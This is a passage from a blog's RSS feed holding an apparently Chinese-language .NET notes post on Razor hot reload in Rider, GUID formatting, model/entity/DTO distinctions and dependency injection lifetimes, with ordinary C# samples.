<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>42th openheart</title>
    <link>https://www.openheart.icu/</link>
    <description>Recent content on 42th openheart</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>ALL RIGHTS RESERVED KRIS NIE</copyright>
    <lastBuildDate>Fri, 31 Jul 2020 22:59:51 +0000</lastBuildDate>
    
        <atom:link href="https://www.openheart.icu/index.xml" rel="self" type="application/rss+xml" />
    
    
    
        <item>
        <title>.Net Issue</title>
        <link>https://www.openheart.icu/cs/dot-net-issue/</link>
        <pubDate>Fri, 31 Jul 2020 22:59:51 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/dot-net-issue/</guid>
        <description>42th openheart https://www.openheart.icu/cs/dot-net-issue/ -&lt;h1 id=&#34;hot-reload-razor-views&#34;&gt;Hot-Reload Razor Views&lt;/h1&gt;
&lt;p&gt;在mac上使用Rider创建 .net core mvc项目后发现run和debug，都无法热加载razor页面。经过Google后发现，这并不是Rider的bug，这得需要知道mvc到底是如何运行的（&lt;em&gt;it&amp;rsquo;s fundamentally how ASP.NET MVC Core works&lt;/em&gt;）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Razor files are compiled at both &lt;strong&gt;build&lt;/strong&gt; and &lt;strong&gt;publish&lt;/strong&gt; time using the Razor SDK. Runtime compilation may be optionally enabled by configuring your application.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用Razor SDK在构建和发布时都会编译Razor文件。通过配置您的应用程序，可以选择启用&lt;strong&gt;运行时编译&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note that run time is not included in this list by default.&lt;/strong&gt; To change this behaviour:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;Add the Nuget package &lt;a href=&#34;https://www.nuget.org/packages/Microsoft.AspNetCore.Mvc.Razor.RuntimeCompilation/&#34;&gt;&lt;code&gt;Microsoft.AspNetCore.Mvc.Razor.RuntimeCompilation&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Change your &lt;code&gt;Startup.ConfigureServices&lt;/code&gt; code to include runtime compilation:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;void&lt;/span&gt; ConfigureServices(IServiceCollection services)
{
  services
    .AddControllersWithViews()
    .AddRazorRuntimeCompilation();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/58300922/how-to-enable-the-view-hot-reloading-in-rider&#34;&gt;How to enable the view hot-reloading in Rider? &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/zh-cn/aspnet/core/mvc/views/view-compilation?view=aspnetcore-3.0&amp;amp;tabs=visual-studio#runtime-compilation&#34;&gt;Razor file compilation in ASP.NET Core&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;watch-out-project-on-rider&#34;&gt;Watch out Project On Rider&lt;/h1&gt;
&lt;p&gt;To let Project hot-reload, we can use the &amp;ldquo;Before launch&amp;rdquo; option as a run configuration to make this happen. To do so:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Select Run -&amp;gt; Edit Configuration from the menu options&lt;/li&gt;
&lt;li&gt;Add a new &lt;code&gt;Before launch&lt;/code&gt;Click the + icon and select the &amp;ldquo;Run Executnal Tool &amp;quot; option from the list&lt;/li&gt;
&lt;li&gt;In the options that are displayed, provide the following&amp;hellip;
&lt;ul&gt;
&lt;li&gt;Name: Watch (or whatever you prefer)&lt;/li&gt;
&lt;li&gt;Exe path: /usr/local/share/dotnet/dotnet&lt;/li&gt;
&lt;li&gt;Program Arguments: watch run&lt;/li&gt;
&lt;li&gt;Working directory: [path to your project where .csproj file resides]&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Click &amp;ldquo;OK&amp;rdquo; to apply/save the changes.&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;reference-1&#34;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/46349038/jetbrains-rider-run-with-watch&#34;&gt;JetBrains Rider run with watch&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;newguid&#34;&gt;NewGuid()&lt;/h1&gt;
&lt;h2 id=&#34;guid&#34;&gt;GUID&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;全局唯一标识符&lt;/strong&gt;（Globally Unique &lt;strong&gt;Id&lt;/strong&gt;entifier，缩写：&lt;strong&gt;GUID&lt;/strong&gt;；发音为/ˈɡuːɪd/或/ˈɡwɪd/）是一种由&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E7%AE%97%E6%B3%95&#34;&gt;算法&lt;/a&gt;生成的唯一标识，通常表示成32个16进制数字（0－9，A－F）组成的字符串，如：&lt;code&gt;{21EC2020-3AEA-1069-A2DD-08002B30309D}&lt;/code&gt;，它实质上是一个128位长的二进制整数。GUID一词有时也专指微软对UUID标准的实现。&lt;/p&gt;
&lt;p&gt;GUID的主要目的是产生完全唯一的数字。在理想情况下，任何计算机和计算机集群都不会生成两个相同的GUID。GUID的总数也足够大，达到了2128（3.4×1038）个，所以随机生成两个相同GUID的可能性是非常小的，但并不为0。所以，用于生成GUID的算法通常都加入了非随机的参数（时间），以保证这种重复的情况不会发生。&lt;/p&gt;
&lt;p&gt;GUID 主要用于在拥有多个节点、多台计算机的网络或系统中，分配必须具有唯一性的标识符。在 Windows 平台上，GUID 应用非常广泛：注册表、类及接口标识、数据库、甚至自动生成的机器名、目录名等。&lt;/p&gt;
&lt;p&gt;与自增长id相比较：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;缺点&lt;/strong&gt;&lt;/th&gt;
&lt;th&gt;&lt;strong&gt;优点&lt;/strong&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;GUID&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1. GUID过长，看表现形式，至少都有32位，长的38位，浪费存储空间 2. GUID是根据硬件设备相关ID以及时间戳生成的 3. GUID不利于检索、外键关联&lt;/td&gt;
&lt;td&gt;1. 一般来说不担心有冲突的影响，而且，根据GUID的生成规则，还能大致知道生成的计算机硬件设备、时间等信息（但这个有多少意义呢）2. 能在业务层就知道目标ID，而不是数据提交给数据库系统后才确定&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;自增长&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;1. 多数据库同步、读写分离十分不方便。&lt;/td&gt;
&lt;td&gt;1. 使用简单&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;systemguidnewguidtostring&#34;&gt;System.Guid.NewGuid().ToString()&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Guid.NewGuid()是指生成唯一码的规则&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;systemguidnewguidtostringformat&#34;&gt;System.Guid.NewGuid().ToString(format)&lt;/h3&gt;
&lt;p&gt;说明符 返回值的格式&lt;/p&gt;
&lt;p&gt;N 32 位字符：xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&lt;/p&gt;
&lt;p&gt;D 由连字符分隔的 32 位数字：xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&lt;/p&gt;
&lt;p&gt;B 括在大括号中、由连字符分隔的 32 位数字：{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}&lt;/p&gt;
&lt;p&gt;P 括在圆括号中、由连字符分隔的 32 位数字：(xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)&lt;/p&gt;
&lt;p&gt;Guid.NewGuid().ToString()		  : 1f13a943-4c7e-4bfc-aac5-935886591424&lt;/p&gt;
&lt;p&gt;Guid.NewGuid().ToString(&amp;ldquo;N&amp;rdquo;)	: 3a81013f9ee549b38f11ee3d50f5bd78&lt;/p&gt;
&lt;p&gt;Guid.NewGuid().ToString(&amp;ldquo;D&amp;rdquo;)	: c4219375-c2c8-4639-86e8-8d910ed12186 &amp;ndash; 默认为：D&lt;/p&gt;
&lt;p&gt;Guid.NewGuid().ToString(&amp;ldquo;B&amp;rdquo;)	: {a793927d-9a1b-4d25-9562-0a59522db9c0}&lt;/p&gt;
&lt;p&gt;Guid.NewGuid().ToString(&amp;ldquo;P&amp;rdquo;)	: (a99839b9-da94-40fd-87a5-4a5e73677b1f)&lt;/p&gt;
&lt;p&gt;Guid.NewGuid().ToString(&amp;ldquo;X&amp;rdquo;)	: {0xb294a44e,0x43d9,0x4b60,{0xb5,0xb9,0x32,0x29,0xae,0x46,0x45,0x17}}&lt;/p&gt;
&lt;p&gt;&lt;em&gt;如果在程序中使用&lt;strong&gt;D&lt;/strong&gt;，则需要注意数据库字段长应为&lt;code&gt;36&lt;/code&gt;而不是32&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;model--entity--dto--viewmodel&#34;&gt;model &amp;amp; entity &amp;amp; dto &amp;amp; viewmodel&lt;/h1&gt;
&lt;h2 id=&#34;model&#34;&gt;model&lt;/h2&gt;
&lt;p&gt;model是一个模型，里面装了各种数据，将一个model传递给view，在试图页面就可以使用model里面的数据来呈现到页面上。&lt;/p&gt;
&lt;h2 id=&#34;entity&#34;&gt;entity&lt;/h2&gt;
&lt;p&gt;entity是实体，就是和数据表一一对应的，一个实体一张表&lt;/p&gt;
&lt;p&gt;官方的demo没有entity这个说法，他只有model，model就是表，也是传递给view的model，就是说他的model即是model又是entity。而我们实际运用需要将model分成ViewModel和Entity，甚至还要加入Dto。&lt;/p&gt;
&lt;h2 id=&#34;viewmodel&#34;&gt;viewmodel&lt;/h2&gt;
&lt;p&gt;MSDOC详细介绍页面直接返回一个model，这个model就是表中的一条数据。但是在我们实际建站需求中页面上怎么可能只需要一条数据就完了，很多时候还需要其他的数据。比如一个&lt;code&gt;List&amp;lt;entity&amp;gt;&lt;/code&gt;，此时就需要使用ViewModel。&lt;/p&gt;
&lt;h2 id=&#34;dtodata-transfer-object&#34;&gt;dto(Data transfer object)&lt;/h2&gt;
&lt;p&gt;entity里包含的是表所有的字段，但在实际应用的时候我们可能不会使用到所有的字段，可能只需要一个名称和编号即可，所以就需要使用dto（数据传输对象）。此时ViewModel就可以使用&lt;code&gt;List&amp;lt;dto&amp;gt;&lt;/code&gt;返回我们部分数据而不是整个表数据。&lt;/p&gt;
&lt;h2 id=&#34;final&#34;&gt;Final&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;我们可以花一部分精力去考虑这方面问题，但也不用纠结太多，头大且对项目也没太大帮助。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;reference-2&#34;&gt;Reference&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://www.zhihu.com/question/25256772/answer/194493331&#34;&gt;什么时候用Model，什么时候用Entity？ - 虚若影的回答 - 知乎&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.zhihu.com/question/25256772/answer/30290376&#34;&gt;什么时候用Model，什么时候用Entity？ - 赵劼的回答 - 知乎&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;dependency-injection&#34;&gt;Dependency Injection&lt;/h1&gt;
&lt;h2 id=&#34;ioc&#34;&gt;IOC&lt;/h2&gt;
&lt;p&gt;Spring 框架为Java提供了IOC（Inversion of Control），只是提供了一个服务容器，程序控制我们需要的对象，而不是在使用对象时我们亲自直接控制。既然提到了IOC就详细了解一下这种设计思想：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.openheart.icu/image/Coupling-20200808133032885.png&#34; alt=&#34;Coupling-20200808133032885.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;为了解决对象间耦合度过高的问题，软件专家Michael Mattson提出了IOC理论，用来实现对象之间的“解耦”。&lt;/p&gt;
&lt;p&gt;控制反转是一种是面向对象编程中的一种设计原则，用来减低计算机代码之间的耦合度。其基本思想是：借助于“第三方”实现具有依赖关系的对象之间的解耦。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.openheart.icu/image/IOC-20200808134840983.png&#34; alt=&#34;IOC-20200808134840983&#34;&gt;&lt;/p&gt;
&lt;p&gt;软件系统在没有引入IOC容器之前，对象A依赖于对象B，那么对象A在初始化或者运行到某一点的时候，自己必须主动去创建对象B或者使用已经创建的对象B。无论是创建还是使用对象B，控制权都在自己手上。&lt;/p&gt;
&lt;p&gt;软件系统在引入IOC容器之后，这种情形就完全改变了，由于IOC容器的加入，对象A与对象B之间失去了直接联系，所以，当对象A运行到需要对象B的时候，IOC容器会主动创建一个对象B注入到对象A需要的地方。&lt;/p&gt;
&lt;p&gt;通过前后的对比，我们不难看出来：对象A获得依赖对象B的过程,由主动行为变为了被动行为，控制权颠倒过来了，这就是“控制反转”这个名称的由来。&lt;/p&gt;
&lt;p&gt;控制反转可以用来减低计算机代码之间的耦合度。 其中最常见的方式叫做依赖注入（Dependency Injection，简称DI），还有一种方式叫“依赖查找”（Dependency Lookup）。&lt;/p&gt;
&lt;h2 id=&#34;dip&#34;&gt;DIP&lt;/h2&gt;
&lt;p&gt;要了解控制反转( Inversion of Control ), 我觉得有必要先了解软件设计的一个重要思想：依赖倒置原则（Dependency Inversion Principle ）。&lt;/p&gt;
&lt;p&gt;依赖倒置原则（Dependence Inversion Principle）是程序要依赖于抽象接口，不要依赖于具体实现。 简单的说就是要求对抽象进行编程，不要对实现进行编程，这样就降低了客户与实现模块间的耦合。&lt;/p&gt;
&lt;p&gt;在&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B&#34;&gt;面向对象编程&lt;/a&gt;领域中，&lt;strong&gt;依赖反转原则&lt;/strong&gt;（Dependency inversion principle，DIP）是指一种特定的&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%80%A6%E5%90%88%E6%80%A7_(%E8%A8%88%E7%AE%97%E6%A9%9F%E7%A7%91%E5%AD%B8)&#34;&gt;解耦&lt;/a&gt;（传统的&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E8%80%A6%E5%90%88%E6%80%A7_(%E8%A8%88%E7%AE%97%E6%A9%9F%E7%A7%91%E5%AD%B8)&#34;&gt;依赖&lt;/a&gt;关系创建在高层次上，而具体的策略设置则应用在低层次的模块上）形式，使得高层次的模块不依赖于低层次的模块的实现细节，依赖关系被颠倒（反转），从而使得低层次模块依赖于高层次模块的需求抽象。&lt;/p&gt;
&lt;p&gt;该原则规定：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;高层次的模块不应该依赖于低层次的模块，两者都应该依赖于&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E6%8A%BD%E8%B1%A1%E5%8C%96_(%E8%A8%88%E7%AE%97%E6%A9%9F%E7%A7%91%E5%AD%B8)&#34;&gt;抽象接口&lt;/a&gt;。&lt;/li&gt;
&lt;li&gt;抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;该原则颠倒了一部分人对于面向对象设计的认识方式。如高层次和低层次对象都应该依赖于相同的抽象接口。控制反转就是依赖倒置原则的一种代码设计的思路。具体采用的方法就是所谓的依赖注入（Dependency Injection）。&lt;/p&gt;
&lt;p&gt;设计模式中的五大原则 &lt;a href=&#34;https://zh.wikipedia.org/wiki/SOLID_(%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E8%AE%BE%E8%AE%A1)&#34;&gt;SOLID&lt;/a&gt; 中的 D 指代的就是依赖反转原则。&lt;/p&gt;
&lt;p&gt;eg: &lt;a href=&#34;https://flylib.com/books/en/4.444.1.71/1/&#34;&gt;Lamp and Button：A Simple DIP Example&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;di&#34;&gt;DI&lt;/h2&gt;
&lt;h3 id=&#34;ioc与di的区别&#34;&gt;IOC与DI的区别&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;控制反转是一种在软件工程中解耦合的思想，调用类只依赖接口，而不依赖具体的实现类，减少了耦合。控制权交给了容器，在运行的时候才由容器决定将具体的实现动态的“注入”到调用类的对象中。&lt;/li&gt;
&lt;li&gt;依赖注入是一种设计模式，可以作为控制反转的一种实现方式。依赖注入就是将实例变量传入到一个对象中去(Dependency injection means giving an object its instance variables)。&lt;/li&gt;
&lt;li&gt;通过IOC框架，类A依赖类B的强耦合关系可以在运行时通过容器建立，也就是说把创建B实例的工作移交给容器，类A只管使用就可以。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;lifetime&#34;&gt;LifeTime&lt;/h3&gt;
&lt;p&gt;MSDOC指出了有关&lt;code&gt;AddTransient&lt;/code&gt;/&lt;code&gt;AddScoped&lt;/code&gt;/&lt;code&gt;AddSingleton&lt;/code&gt;的区别，并带有一个小示例：&lt;/p&gt;
&lt;p&gt;创建一个Operation接口然后分别对应实现上述三种依赖注入，为Operation添加属性&lt;code&gt;Guid OperationId&lt;/code&gt;，凭借此属性值，我们可以在逻辑层与controller控制器中分别implement，对比两处implement的OperationId可以发现这三种模式的lifetime。（&lt;em&gt;The &lt;code&gt;IOperationSingletonInstance&lt;/code&gt; service is using a specific instance with a known ID of &lt;code&gt;Guid.Empty&lt;/code&gt;. It&amp;rsquo;s clear when this type is in use (its GUID is all zeroes).&lt;/em&gt;）&lt;/p&gt;
&lt;p&gt;IOperation：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;interface&lt;/span&gt; IOperation
{
  Guid OperationId { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;; }
}

&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;interface&lt;/span&gt; IOperationTransient : IOperation
{
}
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;interface&lt;/span&gt; IOperationScoped : IOperation
{
}
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;interface&lt;/span&gt; IOperationSingleton : IOperation
{
}
&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;interface&lt;/span&gt; IOperationSingletonInstance : IOperation
{
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Operation:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;Operation&lt;/span&gt; : IOperation, IOperationTransient, IOperationScoped, IOperationSingleton, IOperationSingletonInstance
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; Guid OperationId { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;; }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; Operation(Guid operationId)
  {
    OperationId = operationId;
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; Operation() : &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;(Guid.NewGuid())
  {
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OperationSercice:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;OperationService&lt;/span&gt;
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; IOperationTransient TransientOperation { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;; }
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; IOperationScoped ScopedOperation { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;; }
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; IOperationSingleton SingletonOperation { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;; }
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; IOperationSingletonInstance SingletonInstanceOperation { &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;get&lt;/span&gt;; }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; OperationService(IOperationTransient transientOperation,
                          IOperationScoped scopedOperation,
                          IOperationSingleton singletonOperation,
                          IOperationSingletonInstance instanceOperation)
  {
    TransientOperation = transientOperation;
    ScopedOperation = scopedOperation;
    SingletonOperation = singletonOperation;
    SingletonInstanceOperation = instanceOperation;
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;OperationController:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-C#&#34; data-lang=&#34;C#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;OperationsController&lt;/span&gt; : Controller
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; OperationService _operationService;
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; IOperationTransient _transientOperation;
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; IOperationScoped _scopedOperation;
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; IOperationSingleton _singletonOperation;
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;readonly&lt;/span&gt; IOperationSingletonInstance _singletonInstanceOperation;

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; OperationsController(OperationService operationService,
                              IOperationTransient transientOperation,
                              IOperationScoped scopedOperation,
                              IOperationSingleton singletonOperation,
                              IOperationSingletonInstance singletonInstanceOperation)
  {
    _operationService = operationService;
    _transientOperation = transientOperation;
    _scopedOperation = scopedOperation;
    _singletonOperation = singletonOperation;
    _singletonInstanceOperation = singletonInstanceOperation;
  }

  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; IActionResult Index()
  {
    &lt;span style=&#34;color:#228b22&#34;&gt;// viewbag contains controller-requested services
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    ViewBag.Transient = _transientOperation;
    ViewBag.Scoped = _scopedOperation;
    ViewBag.Singleton = _singletonOperation;
    ViewBag.SingletonInstance = _singletonInstanceOperation;

    &lt;span style=&#34;color:#228b22&#34;&gt;// operation service has its own requested services
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    ViewBag.Service = _operationService;
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; View();
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;两次请求对比如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.openheart.icu/image/DI-20200809140803.png&#34; alt=&#34;DI-20200809140803&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://www.openheart.icu/image/DI-20200809140837.png&#34; alt=&#34;DI-20200809140837&#34;&gt;&lt;/p&gt;
&lt;p&gt;观察在请求中以及请求之间的哪个&lt;code&gt;OperationId&lt;/code&gt;值有所不同。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Transient 对象总是不同的; 每个控制器和每个服务都提供了一个新的实例。&lt;/li&gt;
&lt;li&gt;Scoped 对象在请求中是相同的，但在不同的请求中是不同的。&lt;/li&gt;
&lt;li&gt;Singleton 对象对于每个对象和每个请求都是一样的（不管&lt;code&gt;ConfigureServices&lt;/code&gt;中是否提供一个实例）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;reference-3&#34;&gt;Reference&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://zh.wikipedia.org/wiki/%E4%BE%9D%E8%B5%96%E5%8F%8D%E8%BD%AC%E5%8E%9F%E5%88%99&#34;&gt;依赖反转原则&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.jianshu.com/p/07af9dbbbc4b&#34;&gt;控制反转（IOC）与依赖注入（DI）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://zhuanlan.zhihu.com/p/91218464&#34;&gt;.NET Core中的IoC和DI&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.martinfowler.com/articles/injection.html&#34;&gt;Inversion of Control Containers and the Dependency Injection pattern&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://flylib.com/books/en/4.444.1.71/1/&#34;&gt;A Simple DIP Example&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/aspnet/core/fundamentals/dependency-injection?view=aspnetcore-3.1&#34;&gt;Dependency injection in ASP.NET Core&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;iviewlocationexpander&#34;&gt;IViewLocationExpander&lt;/h1&gt;
&lt;p&gt;实现&lt;code&gt;IViewLocationExpander&lt;/code&gt;接口，&lt;code&gt;location&lt;/code&gt;为build时程序检查的views层路径&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ViewLocationExpander&lt;/span&gt;: IViewLocationExpander
{
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; IEnumerable&amp;lt;String&amp;gt; ExpandViewLocations(ViewLocationExpanderContext context, IEnumerable&amp;lt;String&amp;gt; locations)
  {
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (RazorViewEngine.GetNormalizedRouteValue(context.ActionContext, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;area&amp;#34;&lt;/span&gt;) != &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt;)
    {
